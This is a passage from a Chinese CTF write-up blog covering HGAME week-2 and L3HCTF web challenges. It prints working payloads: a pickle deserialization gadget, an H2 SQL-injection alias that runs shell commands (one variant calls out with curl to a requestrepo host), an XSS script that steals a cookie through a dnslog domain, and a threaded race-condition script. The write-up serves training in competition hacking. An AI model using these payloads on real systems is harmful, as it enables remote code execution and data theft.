class="hljs-string">&quot;&#123;&#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> os<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-keyword">object</span>):    def __reduce__(self):        # <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;ls&#x27;</span>,))     不用这个，报错无回显        <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>,))a = A()test = pickle.dumps(a)print(base64.b64encode(test))</code></pre></div><p>要在linux环境下运行py文件，因为不同系统会造成不同的结果</p><p>linux中为<code>posix</code></p><p>windows中为<code>nt</code></p><p><img src="/../images/HGAME-WEEK2/image-20240205211258233.png" alt="image-20240205211258233"></p><h2 id="search4member"><a href="#search4member" class="headerlink" title="search4member *"></a>search4member *</h2><p>真的服了，都发现是h2数据库的漏洞了，照着网上的payload打，老是宕机</p><p><img src="/../images/HGAME-WEEK2/image-20240215211815950.png" alt="image-20240215211815950"></p><p>给出失误后也不知道咋改，就放弃了</p><p>看附件，就是正常的SQL查询语句，看到不同的地方就是用了h2数据库，看了依赖也没其他的，便查h2数据库的漏洞</p><div class="code-wrapper"><pre><code class="hljs lasso">@Mapping(<span class="hljs-string">&quot;/&quot;</span>)<span class="hljs-keyword">public</span> ModelAndView search(@Param(defaultValue = <span class="hljs-string">&quot;web&quot;</span>) <span class="hljs-built_in">String</span> <span class="hljs-built_in">keyword</span>) throws SQLException &#123;    <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">String</span>&gt; results = <span class="hljs-literal">new</span> ArrayList&lt;&gt;();    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">keyword</span> != <span class="hljs-built_in">null</span> &amp; !<span class="hljs-built_in">keyword</span>.<span class="hljs-keyword">equals</span>(<span class="hljs-string">&quot;&quot;</span>)) &#123;        <span class="hljs-built_in">String</span> sql = <span class="hljs-string">&quot;SELECT * FROM member WHERE intro LIKE &#x27;%&quot;</span> + <span class="hljs-built_in">keyword</span> + <span class="hljs-string">&quot;%&#x27;;&quot;</span>;        DataSource dataSource = dbManager.getDataSource();        Statement statement = dataSource.getConnection().createStatement();        <span class="hljs-keyword">ResultSet</span> <span class="hljs-keyword">resultSet</span> = statement.executeQuery(sql);        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">resultSet</span>.next()) &#123;            results.add(<span class="hljs-keyword">resultSet</span>.getString(<span class="hljs-string">&quot;id&quot;</span>) + <span class="hljs-string">&quot; : &quot;</span>                    + <span class="hljs-keyword">resultSet</span>.getString(<span class="hljs-string">&quot;intro&quot;</span>) + <span class="hljs-string">&quot; : &quot;</span>                    + <span class="hljs-keyword">resultSet</span>.getString(<span class="hljs-string">&quot;blog&quot;</span>));        &#125;        <span class="hljs-keyword">resultSet</span>.close();        statement.close();    &#125;    ModelAndView model = <span class="hljs-literal">new</span> ModelAndView(<span class="hljs-string">&quot;search.ftl&quot;</span>);    model.put(<span class="hljs-string">&quot;results&quot;</span>, results);    <span class="hljs-keyword">return</span> model;&#125;</code></pre></div><p>找到<a href="https://blog.csdn.net/qq_34101364/article/details/109558683?spm=1001.2014.3001.5501">通过H2 数据库get shell_h2 getshell-CSDN博客</a></p><p>我的复现做法</p><div class="code-wrapper"><pre><code class="hljs reasonml">&#x27;; CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = <span class="hljs-keyword">new</span> java.util.<span class="hljs-constructor">Scanner(Runtime.<span class="hljs-params">getRuntime</span>()</span>.exec(cmd).get<span class="hljs-constructor">InputStream()</span>).use<span class="hljs-constructor">Delimiter(<span class="hljs-string">&quot;\\A&quot;</span>)</span>; return s.has<span class="hljs-constructor">Next()</span> ? s.next<span class="hljs-literal">()</span> : <span class="hljs-string">&quot;&quot;</span>;  &#125;$$;CALL <span class="hljs-constructor">SHELLEXEC(&#x27;<span class="hljs-params">id</span>&#x27;)</span>;&#x27;</code></pre></div><p>但是这里不能直接<code>CALL SHELLEXEC(&#39;id&#39;);</code>，因为没有回显的地方</p><p>这里</p><div class="code-wrapper"><pre><code class="hljs reasonml">&#x27;; CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = <span class="hljs-keyword">new</span> java.util.<span class="hljs-constructor">Scanner(Runtime.<span class="hljs-params">getRuntime</span>()</span>.exec(cmd).get<span class="hljs-constructor">InputStream()</span>).use<span class="hljs-constructor">Delimiter(<span class="hljs-string">&quot;\\A&quot;</span>)</span>; return s.has<span class="hljs-constructor">Next()</span> ? s.next<span class="hljs-literal">()</span> : <span class="hljs-string">&quot;&quot;</span>;  &#125;$$;&#x27;</code></pre></div><p>是可以成功注册shellexec函数的，只是页面报错而已（我当时以为直接宕机了</p><p>然后WP给了很妙的方法，把数据插入表中，然后再查询</p><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">%</span><span class="language-bash"><span class="hljs-string">&#x27;;INSERT INTO member (id, intro, blog) VALUES (&#x27;</span>flag<span class="hljs-string">&#x27;,&#x27;</span>flag<span class="hljs-string">&#x27;,SHELLEXEC(&#x27;</span><span class="hljs-built_in">cat</span> /flag<span class="hljs-string">&#x27;));&#x27;</span></span></code></pre></div><p>最后查询flag</p><p><img src="/../images/HGAME-WEEK2/image-20240215211535164.png" alt="image-20240215211535164"></p><p>但是我这里的语句都是会导致页面报错的</p><p>看看官方WP的不会报错的吧</p><div class="code-wrapper"><pre><code class="hljs n1ql">SJTU%&#x27;;<span class="hljs-keyword">CREATE</span> ALIAS SHELLEXEC <span class="hljs-keyword">AS</span> $$ <span class="hljs-keyword">String</span> shellexec(<span class="hljs-keyword">String</span> cmd) throwsjava.io.IOException &#123; java.util.Scanner s = newjava.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>); return s.hasNext() ? s.next() : &quot;&quot;; &#125;$$;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> member <span class="hljs-keyword">WHERE</span>intro <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%13</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs n1ql">SJTU%&#x27;;<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> member (id, intro, blog) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,SHELLEXEC(<span class="hljs-string">&#x27;cat /flag&#x27;</span>));<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> member <span class="hljs-keyword">WHERE</span> intro <span class="hljs-keyword">LIKE</span><span class="hljs-string">&#x27;%13</span></code></pre></div><h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>….原来可以一起执行，带出网就行了</p><div class="code-wrapper"><pre><code class="hljs reasonml">zzz%<span class="hljs-number">25</span>&#x27;;CREATE ALIAS SHELLEXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123;java.util.Scanner s = <span class="hljs-keyword">new</span> java.util.<span class="hljs-constructor">Scanner(Runtime.<span class="hljs-params">getRuntime</span>()</span>.exec(cmd).get<span class="hljs-constructor">InputStream()</span>); <span class="hljs-keyword">if</span> (s.has<span class="hljs-constructor">Next()</span>) &#123;return s.next<span class="hljs-literal">()</span>;&#125; throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">IllegalArgumentException()</span>;&#125;&#x27;; CALL <span class="hljs-constructor">SHELLEXEC(&#x27;<span class="hljs-params">curl</span> 28zrgzsc.<span class="hljs-params">requestrepo</span>.<span class="hljs-params">com</span>&#x27;)</span>;--+</code></pre></div><h2 id="梅开二度"><a href="#梅开二度" class="headerlink" title="梅开二度 *"></a>梅开二度 *</h2><div class="code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">&quot;context&quot;</span><span class="hljs-string">&quot;log&quot;</span><span class="hljs-string">&quot;net/url&quot;</span><span class="hljs-string">&quot;os&quot;</span><span class="hljs-string">&quot;regexp&quot;</span><span class="hljs-string">&quot;sync&quot;</span><span class="hljs-string">&quot;text/template&quot;</span><span class="hljs-string">&quot;time&quot;</span><span class="hljs-string">&quot;github.com/chromedp/chromedp&quot;</span><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><span class="hljs-string">&quot;golang.org/x/net/html&quot;</span>)<span class="hljs-keyword">var</span> re = regexp.MustCompile(<span class="hljs-string">`script|file|on`</span>)<span class="hljs-keyword">var</span> lock sync.Mutex<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), <span class="hljs-built_in">append</span>(chromedp.DefaultExecAllocatorOptions[:],chromedp.NoSandbox, chromedp.DisableGPU)...)<span class="hljs-keyword">defer</span> cancel()r := gin.Default()r.GET(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;tmplStr := c.Query(<span class="hljs-string">&quot;tmpl&quot;</span>)<span class="hljs-keyword">if</span> tmplStr == <span class="hljs-string">&quot;&quot;</span> &#123;tmplStr = defaultTmpl&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span> re.MatchString(tmplStr) &#123;c.String(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;tmpl contains invalid word&quot;</span>)<span class="hljs-keyword">return</span>&#125;<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmplStr) &gt; <span class="hljs-number">50</span> &#123;c.String(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;tmpl is too long&quot;</span>)<span class="hljs-keyword">return</span>&#125;tmplStr = html.EscapeString(tmplStr)&#125;tmpl, err := template.New(<span class="hljs-string">&quot;resp&quot;</span>).Parse(tmplStr)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;parse template error: %v&quot;</span>, err)<span class="hljs-keyword">return</span>&#125;<span class="hljs-keyword">if</span> err := tmpl.Execute(c.Writer, c); err != <span class="hljs-literal">nil</span> &#123;c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;execute template error: %v&quot;</span>, err)&#125;&#125;)r.GET(<span class="hljs-string">&quot;/bot&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;rawURL := c.Query(<span class="hljs-string">&quot;url&quot;</span>)u, err := url.Parse(rawURL)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;c.String(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;url is invalid&quot;</span>)<span class="hljs-keyword">return</span>&#125;<span class="hljs-keyword">if</span> u.Host != <span class="hljs-string">&quot;127.0.0.1:8080&quot;</span> &#123;c.String(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;host is invalid&quot;</span>)<span class="hljs-keyword">return</span>&#125;<span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;lock.Lock()<span class="hljs-keyword">defer</span> lock.Unlock()ctx, cancel := chromedp.NewContext(allocCtx,chromedp.WithBrowserOption(chromedp.WithDialTimeout(<span class="hljs-number">10</span>*time.Second)),)<span class="hljs-keyword">defer</span> cancel()ctx, _ = context.WithTimeout(ctx, <span class="hljs-number">20</span>*time.Second)<span class="hljs-keyword">if</span> err := chromedp.Run(ctx,chromedp.Navigate(u.String()),chromedp.Sleep(time.Second*<span class="hljs-number">10</span>),); err != <span class="hljs-literal">nil</span> &#123;log.Println(err)&#125;&#125;()c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;bot will visit it.&quot;</span>)&#125;)r.GET(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<span class="hljs-keyword">if</span> c.RemoteIP() != <span class="hljs-string">&quot;127.0.0.1&quot;</span> &#123;c.String(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;you are not localhost&quot;</span>)<span class="hljs-keyword">return</span>&#125;flag, err := os.ReadFile(<span class="hljs-string">&quot;/flag&quot;</span>)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;read flag error&quot;</span>)<span class="hljs-keyword">return</span>&#125;c.SetCookie(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-type">string</span>(flag), <span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>)c.Status(<span class="hljs-number">200</span>)&#125;)r.Run(<span class="hljs-string">&quot;:8080&quot;</span>)&#125;<span class="hljs-keyword">const</span> defaultTmpl = <span class="hljs-string">`</span><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><span class="hljs-string">&lt;html&gt;</span><span class="hljs-string">&lt;head&gt;</span><span class="hljs-string">&lt;title&gt;YOU ARE&lt;/title&gt;</span><span class="hljs-string">&lt;/head&gt;</span><span class="hljs-string">&lt;body&gt;</span><span class="hljs-string">&lt;div&gt;欢迎来自 &#123;&#123;.RemoteIP&#125;&#125; 的朋友&lt;/div&gt;</span><span class="hljs-string">&lt;div&gt;你的 User-Agent 是 &#123;&#123;.GetHeader &quot;User-Agent&quot;&#125;&#125;&lt;/div&gt;</span><span class="hljs-string">&lt;div&gt;flag在bot手上，想办法偷过来&lt;/div&gt;</span><span class="hljs-string">&lt;/body&gt;</span><span class="hljs-string">`</span></code></pre></div><p>我的思路是bot访问flag然后xss带出来</p><p>但这里要是写HTML中带script的js代码，但是不是有正则吗？不懂</p><p>官方WP也挺抽象的，用的是yakit的Fuzztag语法，都看不懂</p><div class="code-wrapper"><pre><code class="hljs html">GET /bot?url=&#123;&#123;url(http://127.0.0.1:8080/?GET=&#123;&#123;url(<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">    (<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">evil</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);</span><span class="language-javascript"></span><span class="language-javascript">        <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/?tmpl=&#123;&#123;.Cookie (.Query.Request.Method)&#125;&#125;&amp;GET=flag&#x27;</span>);</span><span class="language-javascript">        <span class="hljs-keyword">const</span> flag = [...<span class="hljs-keyword">await</span></span><span class="language-javascript">                      res.<span class="hljs-title function_">text</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">a</span>=&gt;</span>a.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>)).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);</span><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span>+=<span class="hljs-string">`&lt;img src=&quot;http://<span class="hljs-subst">$&#123;flag.slice(<span class="hljs-number">0</span>,<span class="hljs-number">50</span>)&#125;</span>.u7byk63s.dnslog.pw&quot;&gt;`</span></span><span class="language-javascript">    &#125;)();</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>)&#125;&#125;&amp;tmpl=&#123;&#123;url(&#123;&#123;.Query .Request.Method&#125;&#125;)&#125;&#125;)&#125;&#125; HTTP/1.1Host: 47.100.137.175:32193</code></pre></div><p>其实答案写在题目描述里了</p><p>上联下联 使用<code>&#123;&#123;.Query .Request.Method&#125;&#125;</code>从另一个方向带入payload，绕过html转义</p><p>横批 -&gt; 二次ssti绕过httponly</p><p><img src="/../images/HGAME-WEEK2/image-20240215221954889.png" alt="image-20240215221954889"></p><p>这看的懂啥</p><h2 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses *"></a>Select More Courses *</h2><p>不懂</p><p>上WP</p><p>弱密码+条件竞争。</p><p>Hint中给出了可供参考的密码字典：</p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts/blob/master/passwordDict/top1000.txt">https://github.com/TheKingOfDuck/fuzzDicts/blob/master/passwordDict/top1000.txt</a>，爆破出弱</p><p>密码为 <code>qwert123</code> 。</p><p>登⼊系统后进⼊ &#x2F;expand 路由，根据提⽰ <code>race against time</code> ，（知道是条件竞争，但是咋弄呢，服了</p><p>并发POST请求 &#x2F;api&#x2F;expand 接⼝，利⽤此处存在的条件竞争漏洞，可实现拓展学分上限，然后选择对应课程获取flag。</p><p>利⽤条件竞争可使⽤BurpSuite⾃带的Intruder模块，也可以⾃⾏编写脚本实现，以下为⼀个可供参考</p><p>的利⽤此处漏洞的python脚本：</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> threading<span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>():    url = <span class="hljs-string">&quot;http://47.102.130.35:30234/api/expand&quot;</span>    headers = &#123;    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;47.102.130.35:30234&quot;</span>,    <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;keep-alive&quot;</span>,    <span class="hljs-string">&quot;Content-Length&quot;</span>: <span class="hljs-string">&quot;23&quot;</span>,    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&quot;</span>,    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,    <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://47.102.130.35:30234&quot;</span>,    <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://47.102.130.35:30234/expand&quot;</span>,    <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>,    <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,    <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;session=MTcwNzEwNzQzM3xEWDhFQVFMX2dBQUJFQUVRQUFBcV80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQW9BQ0cxaE5XaHlNREJ0fHOdF2Z4AqqV3oV6z2EPpM2zyz1UOPBTtu69oB8qnaWM&quot;</span>    &#125;    payload = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;ma5hr00m&quot;</span>&#125;    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">try</span>:            response = requests.post(url, headers=headers, json=payload)            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Response: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<span class="hljs-comment"># 创建50个线程并发发送请求</span>threads = []<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):    thread = threading.Thread(target=send_request)    thread.start()    threads.append(thread) <span class="hljs-comment"># 等待所有线程完成</span><span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:    thread.join()</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>L3HCTF-WEB</title>
    <link href="/2024/02/06/L3HCTF-WEB/"/>
    <url>/2024/02/06/L3HCTF-WEB/</url>
    
    <content type="html"><![CDATA[<h1 id="L3HCTF"><a href="#L3HCTF" class="headerlink" title="L3HCTF"></a>L3HCTF</h1><p>战队前几场发挥不错，师傅们还想冲刺一下final，但是这次成绩不太理想，不知道还有没有机会</p><p>Volcano web 3&#x2F;4   但很遗憾，我爆零了（看到第一题就没什么心情看了）</p><p>就出了一个babySPN。。。密码真签到题</p><h2 id="escape-web"><a href="#escape-web" class="headerlink" title="escape-web"></a>escape-web</h2><p>js执行页面，输入一些错误的会发现是vm2模块</p><p>然后能找到</p><p><a href="https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9">https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9</a></p><p>但是我做到这里就不会了，因为没有回显</p><p>队里lyk师傅使用</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /flag /app/error.txt</code></pre></div><p>成功回显</p><p><img src="/../images/L3HCTF-WEB/image-20240204224527879.png" alt="image-20240204224527879"></p><p>看了其他战队的WP，也都是<code>ln -sf</code></p><p>也可以链接到<code>/app/output.txt</code>文件</p><p>官方说法</p><blockquote><p>ls &gt;&amp;2</p><p>直接cat &#x2F;flag提示No such file or directory，查看进程列表可知跑的是node &#x2F;app&#x2F;dist.js。</p><p>进入&#x2F;app目录，code.js是用户输入的代码，dist.js是打包的程序代码，查看程序代码并没有写文件，猜测error.txt和output.txt是管道重定向产生的文件，挂载在容器内由外部进行读取。</p><p>将output.txt软链接到&#x2F;flag即可读取flag。</p></blockquote><p><img src="/../images/L3HCTF-WEB/image-20240208164001958.png" alt="image-20240208164001958"></p><h2 id="intractable-problem"><a href="#intractable-problem" class="headerlink" title="intractable problem"></a>intractable problem</h2><p>各战队WP都是非预期</p><p>给了附件，但是我没看。。</p><p>现在看了一下</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> oscodes=<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">&lt;&lt;codehere&gt;&gt;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-keyword">try</span>:    codes.encode(<span class="hljs-string">&quot;ascii&quot;</span>)<span class="hljs-keyword">except</span> UnicodeEncodeError:    exit(<span class="hljs-number">0</span>)<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;__&quot;</span> <span class="hljs-keyword">in</span> codes:    exit(<span class="hljs-number">0</span>)codes+=<span class="hljs-string">&quot;\nres=factorization(c)&quot;</span><span class="hljs-built_in">locals</span>=&#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quotquot;</span>,<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>&#125;res=<span class="hljs-built_in">set</span>()<span class="hljs-keyword">def</span> <span class="hljs-title function_">blackFunc</span>(<span class="hljs-params">oldexit</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">event, args</span>):        blackList = [<span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;os&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;interpreter&quot;</span>,<span class="hljs-string">&quot;cpython&quot;</span>,<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;compile&quot;</span>,<span class="hljs-string">&quot;__new__&quot;</span>,<span class="hljs-string">&quot;gc&quot;</span>]        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blackList:            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> (event + <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">str</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> args)).lower():                <span class="hljs-built_in">print</span>(i)                oldexit(<span class="hljs-number">0</span>)    <span class="hljs-keyword">return</span> funccode = <span class="hljs-built_in">compile</span>(codes, <span class="hljs-string">&quot;&lt;judgecode&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)sys.addaudithook(blackFunc(os._exit))<span class="hljs-built_in">exec</span>(code,&#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>&#125;,<span class="hljs-built_in">locals</span>)p=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">locals</span>[<span class="hljs-string">&quot;res&quot;</span>][<span class="hljs-number">0</span>])q=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">locals</span>[<span class="hljs-string">&quot;res&quot;</span>][<span class="hljs-number">1</span>])<span class="hljs-keyword">if</span>(p&gt;<span class="hljs-number">1e5</span> <span class="hljs-keyword">and</span> q&gt;<span class="hljs-number">1e5</span> <span class="hljs-keyword">and</span> p*q==<span class="hljs-built_in">int</span>(<span class="hljs-string">&quotquot;</span>)):    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct!&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-keyword">else</span>:    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> flask<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> subprocesscodes=<span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;oj.py&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:    codes=f.read()flag=<span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:    flag=f.read()app = flask.Flask(__name__)@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)def index():    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&#x27;ui.html&#x27;</span>)@app.route(<span class="hljs-string">&#x27;/judge&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])def judge():    code = flask.request.json[<span class="hljs-string">&#x27;code&#x27;</span>].replace<span class="hljs-function"><span class="hljs-params">(<span class="hljs-string">&quot;def factorization(n: string) -&gt; tuple[int]:&quot;</span>,<span class="hljs-string">&quot;def factorization(n):&quot;</span>)</span></span><span class="hljs-function">    <span class="hljs-title">correctstr</span> = &#x27;&#x27;.<span class="hljs-title">join</span><span class="hljs-params">(random.sample(<span class="hljs-string">&#x27;zyxwvutsrqponmlkjihgfedcba&#x27;</span>, <span class="hljs-number">20</span>))</span></span><span class="hljs-function">    <span class="hljs-title">wrongstr</span> = &#x27;&#x27;.<span class="hljs-title">join</span><span class="hljs-params">(random.sample(<span class="hljs-string">&#x27;zyxwvutsrqponmlkjihgfedcba&#x27;</span>, <span class="hljs-number">20</span>))</span></span><span class="hljs-function">    <span class="hljs-title">print</span><span class="hljs-params">(correctstr,wrongstr)</span></span><span class="hljs-function">    <span class="hljs-title">code</span>=<span class="hljs-title">codes</span>.<span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;Correct&quot;</span>,correctstr)</span>.<span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;Wrong&quot;</span>,wrongstr)</span>.<span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;&lt;&lt;codehere&gt;&gt;&quot;</span>,code)</span></span><span class="hljs-function"></span><span class="hljs-function">    <span class="hljs-title">filename</span> = &quot;<span class="hljs-title">upload</span>/&quot;+<span class="hljs-title">str</span><span class="hljs-params">(time.time())</span> + <span class="hljs-title">str</span><span class="hljs-params">(random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">1000000</span>))</span></span><span class="hljs-function">    <span class="hljs-title">with</span> <span class="hljs-title">open</span><span class="hljs-params">(filename + <span class="hljs-string">&#x27;.py&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)</span> <span class="hljs-title">as</span> <span class="hljs-title">f</span>:</span><span class="hljs-function">        <span class="hljs-title">f</span>.<span class="hljs-title">write</span><span class="hljs-params">(code)</span></span><span class="hljs-function"></span><span class="hljs-function">    <span class="hljs-title">try</span>:</span><span class="hljs-function">        <span class="hljs-title">result</span> = <span class="hljs-title">subprocess</span>.<span class="hljs-title">run</span><span class="hljs-params">([<span class="hljs-string">&#x27;python3&#x27;</span>, filename + <span class="hljs-string">&#x27;.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="hljs-number">5</span>)</span>.<span class="hljs-title">stdout</span>.<span class="hljs-title">decode</span><span class="hljs-params">(<span 